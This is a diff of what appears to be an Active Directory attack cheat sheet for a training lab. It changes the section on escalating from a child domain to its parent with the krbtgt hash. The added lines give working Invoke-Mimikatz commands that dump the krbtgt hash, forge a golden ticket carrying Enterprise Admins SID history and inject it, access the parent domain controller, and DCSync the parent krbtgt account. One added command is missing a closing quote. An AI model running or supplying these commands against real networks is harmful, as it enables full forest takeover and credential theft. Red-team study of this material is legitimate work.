@@ -1275,22 +1275,22 @@ ls \\mcorp dc.corporate.local\c$
 
 ### Child to Parent using Krbtgt Hash
 
-**1. Look for [In] trust key from child to parent:**
 ```powershell
-# Look for [In] trust key from child to parent
-Invoke-Mimikatz -Command '"lsadump::trust /patch"'      
-```
-**2. Create the inter-realm TGT:**
-```powershell
-# Create the inter-realm TGT
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:<hash> /ticket:C:\test\krbtgt_tkt.kirbi"'
-```
-**3. Inject the ticket using mimikatz:**
-```powershell
-# Inject the ticket
-Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krbtgt_tkt.kirbi"'
-# Check
+# Easier version of the previous
+# Look for krbtgt  hash
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'      
+
+# Get the TGS from child domain pushing the SID-HIstory and user over-pass-the-hash
+# The parent  domain will trust the ticket even if it is created in the child domain
+# No need to use other 
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:<hash> /ptt" "exit"
+
+# Access  
 gwmi -class win32_operatingsystem -ComputerName mcorp-dc.corporate.local
+
+# Dcsync across domain
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"'
+
 ```
 **Example:**
 
